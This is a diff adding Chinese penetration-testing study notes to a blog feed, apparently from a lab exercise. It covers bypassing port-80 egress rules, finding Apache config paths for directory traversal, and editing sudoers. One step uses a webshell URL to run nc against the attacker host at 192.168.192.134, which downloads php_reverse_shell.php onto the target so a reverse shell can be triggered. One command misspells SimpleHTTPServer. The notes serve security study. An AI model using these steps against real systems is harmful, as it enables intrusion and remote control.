@@ -4433,6 +4433,26 @@
 <p><img src="https://img.npfs06.top/20230922160336.png"></p>
 <p>也可以编辑<code>/etc/sudoers</code>文件，该文件包含了每个用户可以在不输入密码的情况下使用sudo命令的范围，即执行sudo -l命令时获得的输出结果。可以直接修改该文件给当前的低权限用户添加无须使用密码执行sudo /bash命令的权限。</p>
 <h2 id="Point-9"><a href="#Point-9" class="headerlink" title="Point 9"></a>Point 9</h2><p>跑sqlmap的时候可以设置下<code>--level</code>或者<code>--risk</code></p>
+<h2 id="Point-10"><a href="#Point-10" class="headerlink" title="Point 10"></a>Point 10</h2><p>有的时候会遇到这样一个问题，使用<code>python -m SimpleHTTPServer 80</code>命令开启http服务，但是目标主机系统中的wget命令将无法连接成功。这是因为该主机设置了策略，禁止连接远程主机的80端口，这时会出现如下图所示的连接等待界面。</p>
+<p><img src="https://img.npfs06.top/20230922164722.png"></p>
+<p>而如果在Kali系统中换一个端口开启SimpleHTTPServer，则可以成功绕过上述连接限制。本例中使用如下命令将SimpleHTTPServer改在8882端口开放。</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -m SinpleHTTPServer <span class="number">8882</span></span><br></pre></td></tr></table></figure>
+<p>之后在目标主机系统上使用wget命令访问Kali系统的8882端口下载文件，就不会再受连接限制影响了</p>
+<p><img src="https://img.npfs06.top/20230922164817.png"></p>
+<h2 id="Point-11"><a href="#Point-11" class="headerlink" title="Point 11"></a>Point 11</h2><p>Apache官方提供了一个名为DistrosDefaultLayout的站点，链接如下：</p>
+<p><a href="https://cwiki.apache.org/confluence/display/HTTPD/DistrosDefaultLayout%E3%80%82">https://cwiki.apache.org/confluence/display/HTTPD/DistrosDefaultLayout。</a><br>上述站点提供了Linux各版本系统下Apache的默认安装路径</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">当<span class="keyword">nmap</span>扫描出来的某端口无法访问时，如果条件允许，可以通过Apache中间件的主配置文件httpd.<span class="keyword">conf</span>来查找原因。比如存在目录穿越漏洞时，可通过上诉网站查找路径后配合漏洞进行读取</span><br></pre></td></tr></table></figure>
+<h2 id="Point-12"><a href="#Point-12" class="headerlink" title="Point 12"></a>Point 12</h2><p>Kali系统自带shell文件php_reverse_shell.php，它默认位于<code>/usr/share/webshells/php</code>目录。使用该文件时，首先要将其内部的反弹IP和端口更改为目前Kali系统实际使用的IP以及准备监听反弹shell的端口。</p>
+<p><strong>使用nc传输文件</strong></p>
+<p>攻击机：192.168.192.134<br>目标机器：192.168.192.135</p>
+<p>当目标机器存在远程命令执行漏洞，但发现该目标主机系统限制使用nc的-e命令参数，这导致远程连接无法交互，输入任何命令都会直接断开连接。此外，由于目标主机本地没有bash、Python等程序，因此也导致相关反弹shell方法均不可用。这时使用文件写入方法，利用echo命令写入“一句Webshell”，获得一个可以回显的远程命令执行方式。</p>
+<p><strong>虽然目标主机对nc -e命令进行了限制，但nc传输文件时无须使用-e参数。因此可以借助“一句话Webshell”使用nc上传shell文件。具体操作如下：</strong></p>
+<p>1、利用“一句话Webshell”构建如下链接：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">192.135</span>:<span class="number">8080</span><span class="regexp">/phptax/</span>shell.php?cmd=nc <span class="number">192.168</span>.<span class="number">192.134</span> <span class="number">8888</span> &gt;reverse_shell.php</span><br></pre></td></tr></table></figure>
+<p>该链接中包含的命令将通过nc向192.168.192.134主机的8888端口发起连接请求，并且会将获得的返回数据保存为本地reverse_shell.php。访问上述链接前，在Kali系统的php_reverse_shell.php文件所在的目录下执行如下命令：</p>
+<p><img src="https://img.npfs06.top/20230922172510.png"></p>
+<p>该命令将通过nc监听8888端口。当该端口被访问时，nc会将本地php_reverse_shell.php的文件内容提供给对方。通过在Kali系统以及目标主机分别完成上述操作，就可以成功使用nc实现文件传输，最终的传输结果将保存在目标主机Web目录的reverse_shell.php中。<br>完成上述操作后，使用nc命令重新监听8888端口。</p>
+<p>最后通过浏览器访问链接<code>http://192.168.192.135:8080/xxxxx/reverse_shell.php</code>即可触发反弹shell的执行。</p>
 ]]></content>
       <categories>
         <category>读书笔记</category>
